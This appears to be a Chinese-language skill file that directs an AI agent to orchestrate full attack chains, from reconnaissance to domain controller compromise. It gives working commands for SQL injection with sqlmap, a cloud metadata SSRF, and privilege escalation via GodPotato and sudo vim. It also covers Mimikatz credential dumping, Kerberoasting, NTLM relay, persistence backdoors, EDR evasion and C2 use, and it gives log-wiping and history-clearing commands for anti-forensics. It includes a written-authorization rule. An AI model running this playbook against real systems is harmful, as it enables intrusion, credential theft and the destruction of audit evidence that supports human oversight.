# 攻击链编排（attack-chain）

目标：多阶段攻击路径规划与执行的总指挥。当任务需要"从 A 打到 B"的完整链路时，负责编排各阶段、协调子技能、规划攻击路径。**单阶段任务不需要经过本技能，直接去对应 playbook。**

## 一、何时走本技能

| 场景 | 为什么需要编排 |
|---|---|
| 完整渗透测试 | 规划从信息收集到报告的全流程 |
| 从外网打到域控 | 跨越边界→提权→横向→AD 多阶段 |
| HW 攻防演练 | 完整攻击链 + 隐蔽性 + 痕迹清理 |
| 拿到 webshell 下一步 | 从据点规划后续路径 |
| 评估漏洞链式价值 | 评估漏洞能打到什么程度 |
| 内网渗透全流程 | 横向+提权+域攻击组合 |
| 近源渗透方案 | 物理接入+内网渗透组合 |

单阶段任务（只扫端口、只做 SQLi、只逆 APK）直接去对应 reference，不经过本技能。

## 二、编排原则

```
用户提出多阶段任务
  ↓
attack-chain（本技能）
  ↓ 规划攻击路径、确定阶段顺序、评估每阶段所需工具
  ↓
分发到具体 reference 执行：
  ├── pentest-playbook   → 工具调用、漏洞利用
  ├── apk-reverse        → 移动端渗透
  ├── js-reverse         → Web 前端突破
  ├── linux-dynamic      → 二进制分析
  ├── pwn-chain          → 漏洞利用
  └── edr-bypass         → 防御规避
  ↓
每阶段完成后回到本技能评估下一步
  ↓
全部完成 → 生成报告
```

**路径规划决策树**：
1. 目标是什么？（Web/内网/云/移动/IoT）
2. 当前有什么？（外部视角/已有凭据/已有据点）
3. 最终目标是什么？（域控/数据/特定系统/证明影响）
4. 约束条件？（时间/隐蔽性/不可触碰的系统）
→ 规划最短路径，一条路走不通回到本技能重新规划备选

## 三、完整攻击链七阶段

### 一、信息收集（Reconnaissance）
```bash
# 资产测绘
subfinder -d target.com -o subs.txt
amass enum -d target.com -passive -o amass.txt
cat subs.txt amass.txt | sort -u > all_subs.txt
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```
实战要点：企查查/天眼查找子公司扩大攻击面；关注 test./dev./staging.；crt.sh 证书透明度日志发现隐藏域名。

**敏感信息狩猎**：GitHub 搜索（`org:Company filename:.env password`）、Google Dork、JS 文件 API Key 提取。高价值目标：云 AK/SK、数据库连接串、JWT 密钥、内部 API 文档、VPN/堡垒机凭据。

**员工画像**：社工字典 `{姓名拼音}{年份}`、`{工号}@{域名}`、`{姓名}{后缀}`；来源脉脉/LinkedIn/招聘信息。

**指纹识别**：`whatweb`、`httpx -tech-detect`、`nuclei -tags tech`、`wpscan`。

### 二、边界突破（Initial Access）
| 漏洞类型 | 工具 | 利用方式 |
|---|---|---|
| SQL 注入 | sqlmap | 数据提取→写 shell→OS 命令 |
| SSTI | sstimap | 模板注入→RCE |
| 文件上传 | Burp | Webshell→反弹 shell |
| 反序列化 | ysoserial | Java/PHP/Python RCE |
| SSRF | 手工 | 内网探测→云元数据→AK/SK |
| 未授权访问 | nuclei | Actuator/Nacos/Redis |
| XSS | xsstrike | 管理员会话劫持 |

```bash
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

**供应链攻击**：识别第三方组件→攻击供应商获取更新推送权限→合法通道投递载荷。入口：开源组件投毒、SaaS API 滥用、外包权限、共享 IT 横向。

**钓鱼攻击**：邮件主题模板（VPN 证书过期/邮箱空间不足/绩效查询/报销升级）；载荷类型（Office 宏、LNK、HTML 走私、ISO/IMG、OneNote）；OAuth 钓鱼（无需密码绕过 MFA）。

**近源渗透**：BadUSB（Rubber Ducky）、恶意充电宝（O.MG Cable）、WiFi 钓鱼（Fluxion）、RFID 克隆（Proxmark3）、网络植入（Raspberry Pi/LAN Turtle）。

**VPN 突破**：Pulse Secure（CVE-2019-11510）、Fortinet（CVE-2018-13379）、密码喷洒 `hydra`。

**云服务突破**：S3 桶枚举 `aws s3 ls`、云元数据 SSRF `curl http://169.254.169.254/latest/meta-data/`、Azure AD 密码喷洒。

### 三、权限提升（Privilege Escalation）
**Windows**：Potato 系列（SeImpersonate）、内核漏洞、服务路径劫持、DLL 劫持、AlwaysInstallElevated、计划任务。
```powershell
whoami /priv | findstr "SeImpersonate"
.\GodPotato.exe -cmd "cmd /c whoami"
.\winPEAS.exe
```

**Linux**：SUID 检测、sudo 滥用、内核漏洞（DirtyPipe/DirtyCow）。
```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
sudo vim -c ':!/bin/bash'
./linpeas.sh
```

**数据库提权**：MSSQL `xp_cmdshell`、MySQL UDF、PostgreSQL `COPY TO PROGRAM`。

**云提权**：AWS IAM 枚举找 `iam:PassRole + lambda:CreateFunction`；Azure AD 全局管理员。

### 四、横向移动（Lateral Movement）
**凭据获取**：Mimikatz `sekurlsa::logonpasswords`、`lsadump::dcsync`；Linux `/etc/shadow`、bash_history；NTLM Hash `secretsdump.py`。

**PTH/PTT**：`crackmapexec` PTH 横向；Kerberoasting `GetUserSPNs.py`；AS-REP Roasting `GetNPUsers.py`；金票据 `kerberos::golden`。

**隐蔽横向**：WMI `wmiexec.py`、DCOM `dcomexec.py`、WinRM `evil-winrm`、PsExec、SSH 隧道。

**NTLM Relay**：`responder` 捕获 + `ntlmrelayx.py` + `coercer` 强制认证。

**AD 攻击**：BloodHound 数据收集 + 路径分析；Certipy AD CS 攻击。
```bash
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip
certipy find -u user@domain -p password -dc-ip dc_ip
```

### 五、权限维持（Persistence）
**Windows**：计划任务、注册表 Run 键、WMI 事件订阅（高隐蔽）、DLL 劫持、影子账户、Golden Ticket、DSRM 后门。

**Linux**：SSH 密钥植入、Crontab 后门、LD_PRELOAD 劫持、PAM 后门、Systemd 服务。

**云**：AWS Lambda 后门、Azure AD 应用注册、容器基础镜像后门。

### 六、EDR/AV 绕过（Evasion）
| 层面 | 技术 |
|---|---|
| 静态检测 | 加密/混淆/自定义加载器 |
| 行为检测 | 间接系统调用/Unhooking |
| 内存检测 | 模块踩踏/堆加密 |
| 网络检测 | 域前置/合法服务隧道 |
| 日志检测 | ETW Patching/日志清除 |

实用技术：自定义 shellcode 加载器、系统调用直调、注入低监控进程、C2 走 HTTPS+域前置、Fileless 内存执行、LOLBins 合法签名程序加载。

**C2 框架**：Cobalt Strike（成熟）、Sliver（开源 Go）、Havoc（模块化）、Mythic（多 agent）、AdaptixC2。

### 七、痕迹清理（Anti-Forensics）
```bash
# Windows 日志清除
wevtutil cl Security && wevtutil cl System && wevtutil cl Application
# Linux 日志清除
echo > /var/log/auth.log && echo > /var/log/syslog
history -c && history -w
# 时间戳修改
touch -t 202301010000 /path/to/file
```

## 四、工具速查

| 阶段 | 工具 |
|---|---|
| 信息收集 | subfinder amass httpx naabu nmap whatweb wpscan |
| 漏洞利用 | nuclei sqlmap sstimap xsstrike burpsuite metasploit |
| 权限提升 | winPEAS linpeas GodPotato PrintSpoofer watson |
| 横向移动 | mimikatz crackmapexec impacket bloodhound certipy coercer responder evil-winrm |
| C2 框架 | cobalt-strike sliver havoc mythic adaptixc2 |
| 近源渗透 | fluxion aircrack-ng proxmark3 rubber-ducky wifi-pineapple |

## 五、行动纪律

- 所有操作必须获得书面授权
- 数据渗出需匿名化处理
- 清理所有攻击痕迹（包括内存驻留）
- 每个操作前评估风险等级，高风险操作前通知
- 保持操作日志（时间、动作、结果）
- 发现高危漏洞立即上报，不扩大利用
- 不影响业务可用性（禁止 DoS），不访问真实用户数据

## 六、验证

- 每个阶段有明确产出和下一步依据
- 路径走不通时能回到本技能重新规划备选
- 最终达成目标（域控/数据/证明影响）且有证据
